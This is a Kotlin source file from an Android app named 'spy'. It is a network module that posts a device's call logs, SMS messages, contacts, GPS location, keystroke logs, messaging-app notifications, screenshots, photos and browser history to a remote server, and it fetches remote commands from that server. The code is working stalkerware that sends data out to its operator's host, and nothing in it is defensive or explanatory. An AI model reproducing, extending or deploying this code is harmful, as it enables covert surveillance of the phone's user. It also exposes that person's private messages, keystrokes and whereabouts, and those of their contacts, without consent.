package com.gauravhanna.spy

import android.content.Context
import android.util.Log
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.IOException
import java.util.concurrent.TimeUnit

object NetworkHelper {
    private const val TAG = "NetworkHelper"
    private const val BASE_URL = "https://gauravhanna-spy.onrender.com/api/client"

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    private fun getDeviceId(context: Context): String? {
        return context.getSharedPreferences("spy_prefs", Context.MODE_PRIVATE)
            .getString("device_id", null)
    }

    private fun setDeviceId(context: Context, id: String) {
        context.getSharedPreferences("spy_prefs", Context.MODE_PRIVATE)
            .edit().putString("device_id", id).apply()
    }

    // ========== DEVICE REGISTRATION ==========
    fun registerDevice(context: Context, deviceId: String, deviceName: String, model: String, androidVersion: String, userId: String? = null) {
        val json = JSONObject().apply {
            put("deviceId", deviceId)
            put("deviceName", deviceName)
            put("deviceModel", model)
            put("androidVersion", androidVersion)
            if (userId != null && userId.isNotEmpty()) {
                put("userId", userId)
            }
        }
        val request = Request.Builder()
            .url("$BASE_URL/register")
            .post(json.toString().toRequestBody("application/json".toMediaTypeOrNull()))
            .build()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "Register failed: ${e.message}")
            }
            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) {
                    setDeviceId(context, deviceId)
                    Log.d(TAG, "✅ Device registered")
                } else {
                    Log.e(TAG, "Register HTTP ${response.code}")
                }
                response.close()
            }
        })
    }

    // ========== CALLS ==========
    fun sendCalls(context: Context, calls: List<DataCollector.CallLogEntry>) {
        val deviceId = getDeviceId(context) ?: return
        val arr = JSONArray()
        for (c in calls) {
            arr.put(JSONObject().apply {
                put("phoneNumber", c.number)
                put("contactName", c.name ?: "")
                put("callType", c.type)
                put("duration", c.duration)
                put("timestamp", c.date)
            })
        }
        val body = JSONObject().apply {
            put("deviceId", deviceId)
            put("calls", arr)
        }
        val request = Request.Builder()
            .url("$BASE_URL/calls")
            .post(body.toString().toRequestBody("application/json".toMediaTypeOrNull()))
            .build()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "sendCalls failed: ${e.message}")
            }
            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) Log.d(TAG, "✅ Calls sent")
                else Log.e(TAG, "sendCalls HTTP ${response.code}")
                response.close()
            }
        })
    }

    // ========== SMS ==========
    fun sendSMS(context: Context, smsList: List<DataCollector.SmsEntry>) {
        val deviceId = getDeviceId(context) ?: return
        val arr = JSONArray()
        for (s in smsList) {
            arr.put(JSONObject().apply {
                put("contactNumber", s.address)
                put("message", s.body)
                put("timestamp", s.date)
                put("isIncoming", true)
            })
        }
        val body = JSONObject().apply {
            put("deviceId", deviceId)
            put("messages", arr)
        }
        val request = Request.Builder()
            .url("$BASE_URL/messages")
            .post(body.toString().toRequestBody("application/json".toMediaTypeOrNull()))
            .build()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "sendSMS failed: ${e.message}")
            }
            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) Log.d(TAG, "✅ SMS sent")
                else Log.e(TAG, "sendSMS HTTP ${response.code}")
                response.close()
            }
        })
    }

    // ========== CONTACTS ==========
    fun sendContacts(context: Context, contacts: List<DataCollector.ContactEntry>) {
        val deviceId = getDeviceId(context) ?: return
        val arr = JSONArray()
        for (c in contacts) {
            arr.put(JSONObject().apply {
                put("name", c.name)
                put("number", c.number)
            })
        }
        val body = JSONObject().apply {
            put("deviceId", deviceId)
            put("contacts", arr)
        }
        val request = Request.Builder()
            .url("$BASE_URL/contacts")
            .post(body.toString().toRequestBody("application/json".toMediaTypeOrNull()))
            .build()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "sendContacts failed: ${e.message}")
            }
            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) Log.d(TAG, "✅ Contacts sent")
                else Log.e(TAG, "sendContacts HTTP ${response.code}")
                response.close()
            }
        })
    }

    // ========== LOCATION ==========
    fun sendLocation(context: Context, lat: Double, lng: Double, speed: Float, address: String?) {
        val deviceId = getDeviceId(context) ?: return
        val json = JSONObject().apply {
            put("deviceId", deviceId)
            put("lat", lat)
            put("lng", lng)
            put("speed", speed)
            put("address", address ?: "")
            put("timestamp", System.currentTimeMillis())
        }
        val request = Request.Builder()
            .url("$BASE_URL/location")
            .post(json.toString().toRequestBody("application/json".toMediaTypeOrNull()))
            .build()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "sendLocation failed: ${e.message}")
            }
            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) Log.d(TAG, "✅ Location sent")
                else Log.e(TAG, "sendLocation HTTP ${response.code}")
                response.close()
            }
        })
    }

    // ========== KEYLOG ==========
    fun sendKeylog(context: Context, appPackage: String, text: String) {
        val deviceId = getDeviceId(context) ?: return
        val json = JSONObject().apply {
            put("deviceId", deviceId)
            put("appPackage", appPackage)
            put("text", text)
            put("timestamp", System.currentTimeMillis())
        }
        val request = Request.Builder()
            .url("$BASE_URL/keylogs")
            .post(json.toString().toRequestBody("application/json".toMediaTypeOrNull()))
            .build()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "sendKeylog failed: ${e.message}")
            }
            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) Log.d(TAG, "✅ Keylog sent")
                else Log.e(TAG, "sendKeylog HTTP ${response.code}")
                response.close()
            }
        })
    }

    // ========== APP USAGE ==========
    fun sendAppUsage(context: Context, appPackage: String, appName: String, foregroundTime: Int, timestamp: Long) {
        val deviceId = getDeviceId(context) ?: return
        val json = JSONObject().apply {
            put("deviceId", deviceId)
            put("appPackage", appPackage)
            put("appName", appName)
            put("foregroundTime", foregroundTime)
            put("timestamp", timestamp)
        }
        val request = Request.Builder()
            .url("$BASE_URL/app-usage")
            .post(json.toString().toRequestBody("application/json".toMediaTypeOrNull()))
            .build()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "sendAppUsage failed: ${e.message}")
            }
            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) Log.d(TAG, "✅ App usage sent")
                else Log.e(TAG, "sendAppUsage HTTP ${response.code}")
                response.close()
            }
        })
    }

    // ========== SOCIAL MESSAGES ==========
    fun sendSocialMessage(context: Context, appName: String, sender: String, message: String, timestamp: Long) {
        val deviceId = getDeviceId(context) ?: return
        val json = JSONObject().apply {
            put("deviceId", deviceId)
            put("app", appName)
            put("contactName", sender)
            put("message", message)
            put("timestamp", timestamp)
            put("isIncoming", true)
        }
        val request = Request.Builder()
            .url("$BASE_URL/messages")
            .post(json.toString().toRequestBody("application/json".toMediaTypeOrNull()))
            .build()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "sendSocialMessage failed: ${e.message}")
            }
            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) Log.d(TAG, "✅ Social message sent: $appName from $sender")
                else Log.e(TAG, "sendSocialMessage HTTP ${response.code}")
                response.close()
            }
        })
    }

    // ========== NOTIFICATION MESSAGES ==========
    fun sendNotificationMessage(context: Context, packageName: String, title: String, message: String, timestamp: Long) {
        val deviceId = getDeviceId(context) ?: return

        val appName = when {
            packageName.contains("whatsapp", ignoreCase = true) -> "whatsapp"
            packageName.contains("instagram", ignoreCase = true) -> "instagram"
            packageName.contains("facebook", ignoreCase = true) || packageName.contains("fb", ignoreCase = true) -> "facebook"
            packageName.contains("telegram", ignoreCase = true) -> "telegram"
            packageName.contains("messenger", ignoreCase = true) -> "messenger"
            packageName.contains("gmail", ignoreCase = true) -> "gmail"
            packageName.contains("twitter", ignoreCase = true) -> "twitter"
            packageName.contains("snapchat", ignoreCase = true) -> "snapchat"
            packageName.contains("linkedin", ignoreCase = true) -> "linkedin"
            packageName.contains("discord", ignoreCase = true) -> "discord"
            packageName.contains("signal", ignoreCase = true) -> "signal"
            packageName.contains("line", ignoreCase = true) -> "line"
            packageName.contains("viber", ignoreCase = true) -> "viber"
            packageName.contains("kik", ignoreCase = true) -> "kik"
            packageName.contains("wechat", ignoreCase = true) -> "wechat"
            else -> packageName.substringAfterLast(".")
        }

        val json = JSONObject().apply {
            put("deviceId", deviceId)
            put("app", appName)
            put("contactName", title.ifEmpty { "Unknown" })
            put("message", message)
            put("timestamp", timestamp)
            put("isIncoming", true)
        }
        val request = Request.Builder()
            .url("$BASE_URL/messages")
            .post(json.toString().toRequestBody("application/json".toMediaTypeOrNull()))
            .build()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "sendNotificationMessage failed: ${e.message}")
            }
            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) Log.d(TAG, "✅ Notification message sent: $appName")
                else Log.e(TAG, "sendNotificationMessage HTTP ${response.code}")
                response.close()
            }
        })
    }

    // ========== SCREENSHOTS ==========
    fun sendScreenshot(context: Context, imageBase64: String) {
        val deviceId = getDeviceId(context) ?: return
        val json = JSONObject().apply {
            put("deviceId", deviceId)
            put("imageBase64", imageBase64)
            put("timestamp", System.currentTimeMillis())
        }
        val request = Request.Builder()
            .url("$BASE_URL/screenshot")
            .post(json.toString().toRequestBody("application/json".toMediaTypeOrNull()))
            .build()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "sendScreenshot failed: ${e.message}")
            }
            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) Log.d(TAG, "✅ Screenshot sent")
                else Log.e(TAG, "sendScreenshot HTTP ${response.code}")
                response.close()
            }
        })
    }

    // ========== PHOTO ==========
    fun sendPhoto(context: Context, imageBase64: String) {
        val deviceId = getDeviceId(context) ?: return
        val json = JSONObject().apply {
            put("deviceId", deviceId)
            put("imageBase64", imageBase64)
            put("timestamp", System.currentTimeMillis())
        }
        val request = Request.Builder()
            .url("$BASE_URL/photo")
            .post(json.toString().toRequestBody("application/json".toMediaTypeOrNull()))
            .build()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "sendPhoto failed: ${e.message}")
            }
            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) Log.d(TAG, "✅ Photo sent")
                else Log.e(TAG, "sendPhoto HTTP ${response.code}")
                response.close()
            }
        })
    }

    // ========== BROWSER HISTORY ==========
    fun sendBrowserHistory(context: Context, title: String, url: String, timestamp: Long) {
        val deviceId = getDeviceId(context) ?: return
        val json = JSONObject().apply {
            put("deviceId", deviceId)
            put("title", title)
            put("url", url)
            put("timestamp", timestamp)
        }
        val request = Request.Builder()
            .url("$BASE_URL/browser-history")
            .post(json.toString().toRequestBody("application/json".toMediaTypeOrNull()))
            .build()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "sendBrowserHistory failed: ${e.message}")
            }
            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) Log.d(TAG, "✅ Browser history sent")
                else Log.e(TAG, "sendBrowserHistory HTTP ${response.code}")
                response.close()
            }
        })
    }

    // ========== COMMANDS ==========
    interface CommandCallback {
        fun onCommand(command: String)
    }

    fun getCommand(context: Context, deviceId: String, callback: CommandCallback) {
        val request = Request.Builder()
            .url("$BASE_URL/command/$deviceId")
            .get()
            .build()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "getCommand failed: ${e.message}")
                callback.onCommand("none")
            }
            override fun onResponse(call: Call, response: Response) {
                var command = "none"
                try {
                    val json = response.body?.string()
                    val obj = JSONObject(json ?: "{}")
                    command = obj.optString("command", "none")
                } catch (e: Exception) {
                    Log.e(TAG, "Error parsing command: ${e.message}")
                }
                callback.onCommand(command)
                response.close()
            }
        })
    }
}